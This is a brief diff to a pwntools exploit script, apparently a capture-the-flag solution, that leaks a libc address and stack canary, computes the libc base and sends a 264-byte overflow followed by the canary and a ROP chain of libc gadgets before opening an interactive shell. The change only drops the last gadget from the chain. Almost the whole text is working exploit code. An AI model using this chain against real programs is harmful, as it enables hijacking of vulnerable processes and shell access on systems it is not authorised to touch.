@@ -13,7 +13,7 @@ log.info("Leak: "+ hex(Leak))
 log.info("Canary: "+ hex(Canary))
 libc.address = Leak - libc.sym['_IO_2_1_stdin_']
 log.info("Libc address: "+ hex(libc.address))
-rop = p64(libc.address+0x8aa)+p64(libc.address + 0x215bf) +p64(libc.address + 0x1b3e1a) +p64(libc.address + 0x23eea)+p64(0)+p64(libc.address + 0x4f550)+p64(libc.address+0x8aa)
+rop = p64(libc.address+0x8aa)+p64(libc.address + 0x215bf) +p64(libc.address + 0x1b3e1a) +p64(libc.address + 0x23eea)+p64(0)+p64(libc.address + 0x4f550)
 payload = b"X"*264+p64(Canary)+p64(0)+rop
 proc.sendline(payload)
 proc.interactive()
